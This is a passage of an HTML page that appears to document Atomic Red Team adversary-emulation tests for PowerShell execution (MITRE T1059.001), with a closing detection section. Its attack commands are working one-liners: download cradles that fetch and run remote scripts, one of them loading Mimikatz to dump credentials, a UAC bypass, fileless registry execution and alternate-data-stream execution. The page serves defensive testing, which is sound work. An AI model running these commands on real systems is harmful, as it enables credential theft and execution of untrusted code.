+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>$url=&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1&#39;;$wshell=New-Object -ComObject WScript.Shell;$reg=&#39;HKCU:\Software\Microsoft\Notepad&#39;;$app=&#39;Notepad&#39;;$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName(&#39;System.Windows.Forms&#39;);@(@(&#39;iWindowPosY&#39;,([String]([System.Windows.Forms.Screen]::AllScreens)).Split(&#39;}&#39;)[0].Split(&#39;=&#39;)[5]),@(&#39;StatusBar&#39;,0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys(&#39;^o&#39;);Start-Sleep -Milliseconds 500;@($url,(&#39; &#39;*1000),&#39;~&#39;)|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@(&#39;^a&#39;,&#39;^c&#39;)|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@(&#39;%f&#39;,&#39;x&#39;)|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@(&#39;{TAB}&#39;,&#39;~&#39;)|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@(&#39;iWindowPosDY&#39;,&#39;iWindowPosDX&#39;,&#39;iWindowPosY&#39;,&#39;iWindowPosX&#39;,&#39;StatusBar&#39;)|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1059</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">5</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-6-invoke-apppathbypass">
+<h3>Atomic Test #6 - Invoke-AppPathBypass<a class="headerlink" href="#atomic-test-6-invoke-apppathbypass" title="Permalink to this headline">¶</a></h3>
+<p>Note: Windows 10 only. Upon execution windows backup and restore window will be opened.</p>
+<p>Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id4">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>Powershell.exe &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1&#39;); Invoke-AppPathBypass -Payload &#39;C:\Windows\System32\cmd.exe&#39;&quot;
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1059</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">6</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-7-powershell-msxml-com-object-with-prompt">
+<h3>Atomic Test #7 - Powershell MsXml COM object - with prompt<a class="headerlink" href="#atomic-test-7-powershell-msxml-com-object-with-prompt" title="Permalink to this headline">¶</a></h3>
+<p>Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, “Download Cradle test success!” will be displayed.</p>
+<p>Provided by https://github.com/mgreen27/mgreen27.github.io</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id5">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>powershell.exe -exec bypass -noprofile &quot;$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open(&#39;GET&#39;,&#39;#{url}&#39;,$False);$comMsXml.Send();IEX $comMsXml.ResponseText&quot;
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1059</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">7</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-8-powershell-xml-requests">
+<h3>Atomic Test #8 - Powershell XML requests<a class="headerlink" href="#atomic-test-8-powershell-xml-requests" title="Permalink to this headline">¶</a></h3>
+<p>Powershell xml download request. Upon execution, “Download Cradle test success!” will be dispalyed.</p>
+<p>Provided by https://github.com/mgreen27/mgreen27.github.io</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id6">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot; -exec bypass -noprofile &quot;$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load(&#39;#{url}&#39;);$Xml.command.a.execute | IEX&quot;
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1059</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">8</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-9-powershell-invoke-mshta-exe-download">
+<h3>Atomic Test #9 - Powershell invoke mshta.exe download<a class="headerlink" href="#atomic-test-9-powershell-invoke-mshta-exe-download" title="Permalink to this headline">¶</a></h3>
+<p>Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display “Download Cradle test success!”.</p>
+<p>Provided by https://github.com/mgreen27/mgreen27.github.io</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id7">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>C:\Windows\system32\cmd.exe /c &quot;mshta.exe javascript:a=GetObject(&#39;script:#{url}&#39;).Exec();close()&quot;
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1059</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">9</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-10-powershell-invoke-downloadcradle">
+<h3>Atomic Test #10 - Powershell Invoke-DownloadCradle<a class="headerlink" href="#atomic-test-10-powershell-invoke-downloadcradle" title="Permalink to this headline">¶</a></h3>
+<p>Provided by https://github.com/mgreen27/mgreen27.github.io
+Invoke-DownloadCradle is used to generate Network and Endpoint artifacts.</p>
+<p><strong>Supported Platforms:</strong> windows
+Run it with these steps!</p>
+<ol class="simple">
+<li><p>Open Powershell_ise as a Privileged Account</p></li>
+<li><p>Invoke-DownloadCradle.ps1</p></li>
+</ol>
+</div>
+<div class="section" id="atomic-test-11-powershell-fileless-script-execution">
+<h3>Atomic Test #11 - PowerShell Fileless Script Execution<a class="headerlink" href="#atomic-test-11-powershell-fileless-script-execution" title="Permalink to this headline">¶</a></h3>
+<p>Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open “C:\Windows\Temp” and verify that
+art-marker.txt is in the folder.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id8">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="c"># Encoded payload in next command is the following &quot;Set-Content -path &quot;$env:SystemRoot/Temp/art-marker.txt&quot; -value &quot;Hello from the Atomic Red Team&quot;&quot;</span>
+<span class="n">reg</span><span class="p">.</span><span class="n">exe</span> <span class="n">add</span> <span class="s2">&quot;HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">ART</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="s2">&quot;U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=&quot;</span>
+<span class="nb">iex </span><span class="p">(</span><span class="no">[Text.Encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="no">[Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">((</span><span class="nb">gp </span><span class="s1">&#39;HKCU:\Software\Classes\AtomicRedTeam&#39;</span><span class="p">).</span><span class="n">ART</span><span class="p">)))</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1059</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">11</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-12-powershell-downgrade-attack">
+<h3>Atomic Test #12 - PowerShell Downgrade Attack<a class="headerlink" href="#atomic-test-12-powershell-downgrade-attack" title="Permalink to this headline">¶</a></h3>
+<p>This test requires the manual installation of PowerShell V2.</p>
+<p>Attempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id9">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-version</span> <span class="n">2</span> <span class="n">-Command</span> <span class="nb">Write-Host</span> <span class="nv">$PSVersion</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1059</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">12</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-13-ntfs-alternate-data-stream-access">
+<h3>Atomic Test #13 - NTFS Alternate Data Stream Access<a class="headerlink" href="#atomic-test-13-ntfs-alternate-data-stream-access" title="Permalink to this headline">¶</a></h3>
+<p>Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, “Stream Data Executed” will be displayed.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id10">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id10" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Add-Content</span> <span class="n">-Path</span> <span class="c">#{ads_file} -Value &#39;Write-Host &quot;Stream Data Executed&quot;&#39; -Stream &#39;streamCommand&#39;</span>
+<span class="nv">$streamcommand</span> <span class="p">=</span> <span class="nb">Get-Content</span> <span class="n">-Path</span> <span class="c">#{ads_file} -Stream &#39;streamcommand&#39;</span>
+<span class="nb">Invoke-Expression</span> <span class="nv">$streamcommand</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1059</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">13</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-14-powershell-session-creation-and-use">
+<h3>Atomic Test #14 - PowerShell Session Creation and Use<a class="headerlink" href="#atomic-test-14-powershell-session-creation-and-use" title="Permalink to this headline">¶</a></h3>
+<p>Connect to a remote powershell session and interact with the host.
+Upon execution, network test info and ‘T1086 PowerShell Session Creation and Use’ will be displayed.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id11">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id11" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="c">#{hostname_to_connect}</span>
+<span class="nb">Test-Connection</span> <span class="nv">$env:COMPUTERNAME</span>
+<span class="nb">Set-Content</span> <span class="n">-Path</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">T1086_PowerShell_Session_Creation_and_Use</span> <span class="n">-Value</span> <span class="s2">&quot;T1086 PowerShell Session Creation and Use&quot;</span>
+<span class="nb">Get-Content</span> <span class="n">-Path</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">T1086_PowerShell_Session_Creation_and_Use</span>
+<span class="nb">Remove-Item</span> <span class="n">-Force</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">T1086_PowerShell_Session_Creation_and_Use</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1059</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">14</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="detection">
+<h2>Detection<a class="headerlink" href="#detection" title="Permalink to this headline">¶</a></h2>
+<p>If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.</p>
+<p>Monitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)</p>
+<p>It is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.(Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.</p>
+</div>
+</div>
+
+    <script type="text/x-thebe-config">
+    {
+        requestKernel: true,
+        binderOptions: {
+            repo: "binder-examples/jupyter-stacks-datascience",
+            ref: "master",
+        },
+        codeMirrorConfig: {
+            theme: "abcdef",
+            mode: ".net-powershell"
+        },
+        kernelOptions: {
+            kernelName: ".net-powershell",
+            path: "./tactics/execution"
+        },
+        predefinedOutput: true
+    }
+    </script>
+    <script>kernelName = '.net-powershell'</script>
+
+              </div>
+              
+        </div>
+    </div>
+    
+    
+    <div class='prev-next-bottom'>
+        
+    <a class='left-prev' id="prev-link" href="T1064.html" title="previous page">T1064 - Scripting</a>
+    <a class='right-next' id="next-link" href="T1059.005.html" title="next page">T1059.005 - Command and Scripting Interpreter: Visual Basic</a>
+
+    </div>
+    <footer class="footer mt-5 mt-md-0">
+    <div class="container">
+      <p>
+        
+          By Hare Sudhan Muthusamy<br/>
+        
+            &copy; Copyright 2020.<br/>
+      </p>
+    </div>
+  </footer>
+</main>
+
+
+      </div>
+    </div>
+
+    <script src="../../_static/js/index.js"></script>
+    
+  </body>
+</html>
